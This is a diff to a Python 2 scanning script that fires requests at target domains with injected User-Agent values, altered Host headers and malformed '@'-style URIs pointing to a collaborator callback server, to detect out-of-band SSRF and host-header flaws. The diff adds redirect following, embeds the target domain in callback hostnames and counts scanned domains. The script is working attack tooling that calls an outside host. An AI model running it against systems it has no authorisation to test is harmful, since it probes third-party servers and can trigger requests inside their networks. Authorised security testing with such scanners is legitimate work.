@@ -4,6 +4,7 @@ import httplib
 import os
 import threadpool
 
+count = 0
 
 def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     user_agent = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@ua.%s.%s' % (domainName, collaboratorServerAddress)
@@ -34,8 +35,18 @@ def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     try:
         conn = httplib.HTTPConnection(domainName)
         conn.request("GET", "/", headers=headers)
+        response = conn.getresponse()
+        time = 5
+        while(response.status == 301 or response.status == 302):
+            location = response.getheader("location")
+            conn = httplib.HTTPConnection(location)
+            conn.request("GET", "/", headers=headers)
+            response = conn.getresponse()
+            time = time - 1
+            if time < 0:
+                break
         if verbose:
-            print '[+] GET method using HTTP launch successed, response code is %s ' % conn.getresponse().status
+            print '[+] GET method using HTTP launch successed, response code is %s ' % response.status
     except:
         if verbose:
             print '[-] GET method using HTTP launch failed!'
@@ -46,8 +57,18 @@ def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     try:
         conn = httplib.HTTPSConnection(domainName)
         conn.request("GET", "/", headers=headers)
+        response = conn.getresponse()
+        time = 5
+        while (response.status == 301 or response.status == 302):
+            location = response.getheader("location")
+            conn = httplib.HTTPSConnection(location)
+            conn.request("GET", "/", headers=headers)
+            response = conn.getresponse()
+            time = time - 1
+            if time == 0:
+                break
         if verbose:
-            print '[+] GET method using HTTPS launch successed, response code is %s ' % conn.getresponse().status
+            print '[+] GET method using HTTPS launch successed, response code is %s ' % response.status
     except:
         if verbose:
             print '[-] GET method using HTTPS launch failed!'
@@ -59,8 +80,18 @@ def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     try:
         conn = httplib.HTTPConnection(domainName)
         conn.request("POST", '/', data, headers)
+        response = conn.getresponse()
+        time = 5
+        while (response.status == 301 or response.status == 302):
+            location = response.getheader("location")
+            conn = httplib.HTTPConnection(location)
+            conn.request("POST", '/', data, headers)
+            response = conn.getresponse()
+            time = time - 1
+            if time == 0:
+                break
         if verbose:
-            print '[+] POST method using HTTP launch successed, response code is %s ' % conn.getresponse().status
+            print '[+] POST method using HTTP launch successed, response code is %s ' % response.status
     except:
         if verbose:
             print '[-] POST method using HTTP launch failed!'
@@ -71,8 +102,19 @@ def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     try:
         conn = httplib.HTTPSConnection(domainName)
         conn.request("POST", "/", data, headers)
+        time = 5
+        response = conn.getresponse()
+        while (response.status == 301 or response.status == 302):
+            location = response.getheader("location")
+            conn = httplib.HTTPSConnection(location)
+            conn.request("POST", "/", data, headers)
+            response = conn.getresponse()
+            time = time - 1
+            if time == 0:
+                break
+
         if verbose:
-            print '[+] POST method using HTTPS launch successed, response code is %s ' % conn.getresponse().status
+            print '[+] POST method using HTTPS launch successed, response code is %s ' % response.status
     except:
         if verbose:
             print '[-] POST method using HTTPS launch failed!'
@@ -80,10 +122,9 @@ def loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose):
     finally:
         conn.close()
 
-
 def modifyHostAndLaunch(domainName, collaboratorServerAddress, verbose):
     hosts =[]
-    hosts.append("host1." + collaboratorServerAddress)
+    hosts.append(domainName + ".host1." + collaboratorServerAddress)
     hosts.append(domainName + "@" + "host2." + collaboratorServerAddress)
     hosts.append(domainName + ":@" + "host3." + collaboratorServerAddress)
     hosts.append(domainName + ":80@" "host4." + collaboratorServerAddress)
@@ -94,38 +135,61 @@ def modifyHostAndLaunch(domainName, collaboratorServerAddress, verbose):
         headers.append({'Host': host, 'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close'})
 
     print '[!] Firing at %s with modified host header ' % domainName
+    conn = ''
     for header in headers:
         try:
             conn = httplib.HTTPConnection(domainName)
             conn.request("GET", "/", headers=header)
+            response = conn.getresponse()
+            time = 5
+            while (response.status == 301 or response.status == 302):
+                location = response.getheader("location")
+                conn = httplib.HTTPConnection(location)
+                conn.request("GET", "/", headers=header)
+                response = conn.getresponse()
+                time = time - 1
+                if time == 0:
+                    break
             if verbose:
-                print '[+] Launch "Host: ' + str(header) + '" using HTTP successed, response code is %s' % conn.getresponse().status
-            conn.close()
+                print '[+] Launch "Host: ' + str(header) + '" using HTTP successed, response code is %s' % response.status
         except:
             if verbose:
                 print '[-] Launch "Host: ' + str(header) + '" using HTTP failed'
             pass
+        finally:
+            conn.close()
 
         try:
             conn = httplib.HTTPSConnection(domainName)
             conn.request("GET", "/", headers=header)
+            response = conn.getresponse()
+            time = 5
+            while (response.status == 301 or response.status == 302):
+                location = response.getheader("location")
+                conn = httplib.HTTPSConnection(location)
+                conn.request("GET", "/", headers=header)
+                response = conn.getresponse()
+                time = time - 1
+                if time  == 0:
+                    break
             if verbose:
-                print '[+] Launch "Host: ' + str(header) + '" using HTTPS successed, response code is %s' % conn.getresponse().status
-            conn.close()
+                print '[+] Launch "Host: ' + str(header) + '" using HTTPS successed, response code is %s' % response.status
         except:
             if verbose:
                 print '[-] Launch "Host: ' + str(header) + '" using HTTPS failed'
             pass
+        finally:
+            conn.close()
 
 
 def malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose):
     headers = {'Progma': 'no-cache', 'Cache-control': 'no-cache, no-transform', 'Connection': 'close', 'Host': domainName}
     httpUrls = []
-    httpUrls.append("@mailformedUri1.%s" % collaboratorServerAddress)
-    httpUrls.append(":@mailformeduUri2.%s" % collaboratorServerAddress)
-    httpUrls.append('http://' + 'modifyUrl1.' + collaboratorServerAddress)
-    httpUrls.append('http://' + domainName + "@" + 'modifyUrl2.' + collaboratorServerAddress)
-    httpUrls.append('http://' + domainName + ":@" + 'modifyUrl3.' + collaboratorServerAddress)
+    httpUrls.append("@mailformedUri1.%s.%s" % (domainName,collaboratorServerAddress))
+    httpUrls.append(":@mailformeduUri2.%s.%s" % (domainName,collaboratorServerAddress))
+    httpUrls.append('http://' + 'modifyUrl1.%s.%s' % (domainName,collaboratorServerAddress))
+    httpUrls.append('http://' + domainName + "@" + 'modifyUrl2.%s.%s' % (domainName,collaboratorServerAddress))
+    httpUrls.append('http://' + domainName + ":@" + 'modifyUrl3.%s.%s' % (domainName,collaboratorServerAddress))
 
     httpsUrls = []
     httpsUrls.append("@mailformedUri1.%s" % collaboratorServerAddress)
@@ -137,11 +201,22 @@ def malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose):
 
     print '[!] Firing at %s with Host overridding usring HTTP' % domainName
     for url in httpUrls:
-        httpConn = httplib.HTTPConnection(domainName)
+        httpConn = ''
         try:
+            httpConn = httplib.HTTPConnection(domainName)
             httpConn.request("GET", url, headers=headers)
+            response = httpConn.getresponse()
+            time = 5
+            while (response.status == 301 or response.status == 302):
+                location = response.getheader("location")
+                httpConn = httplib.HTTPConnection(location)
+                httpConn.request("GET", url, headers=headers)
+                response = httpConn.getresponse()
+                time = time - 1
+                if time == 0:
+                    break
             if verbose:
-                print '[+] Launch malformed uri : "' + url + '" using HTTP successed, response code is %s' % httpConn.getresponse().status
+                print '[+] Launch malformed uri : "' + url + '" using HTTP successed, response code is %s' % response.status
         except:
             if verbose:
                 print '[-] Launch malformed uri : "' + url + '" using HTTP failed'
@@ -149,14 +224,24 @@ def malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose):
         finally:
             httpConn.close()
 
-
     print '[!] Firing at %s with Host overridding using HTTPS' % domainName
     for url in httpsUrls:
-        httpsConn = httplib.HTTPSConnection(domainName)
+        httpsConn = ''
         try:
+            httpsConn = httplib.HTTPSConnection(domainName)
             httpsConn.request("GET", url, headers=headers)
+            response = httpsConn.getresponse()
+            time = 5
+            while (response.status == 301 or response.status == 302):
+                location = response.getheader("location")
+                httpsConn = httplib.HTTPSConnection(location)
+                httpsConn.request("GET", url, headers=headers)
+                response = httpsConn.getresponse()
+                time = time - 1
+                if time == 0:
+                    break
             if verbose:
-                print '[+] Launch malformed uri : "' + url + '" using HTTPS successed, response code is %s' % httpsConn.getresponse().status
+                print '[+] Launch malformed uri : "' + url + '" using HTTPS successed, response code is %s' % response.status
         except:
             if verbose:
                 print '[-] Launch malformed uri : "' + url + '" using HTTPS failed'
@@ -169,6 +254,8 @@ def armAndLaunch(domainName, collaboratorServerAddress, verbose):
     loadHeadersAndLaunch(domainName, collaboratorServerAddress, verbose)
     modifyHostAndLaunch(domainName, collaboratorServerAddress, verbose)
     malformedUriAndLaunch(domainName, collaboratorServerAddress, verbose)
+    global count
+    count += 1
 
 
 def main():
@@ -231,3 +318,4 @@ def main():
 
 if __name__ == '__main__':
     main()
+    print '[+] Script done, scaned ' + str(count) + ' domains !'
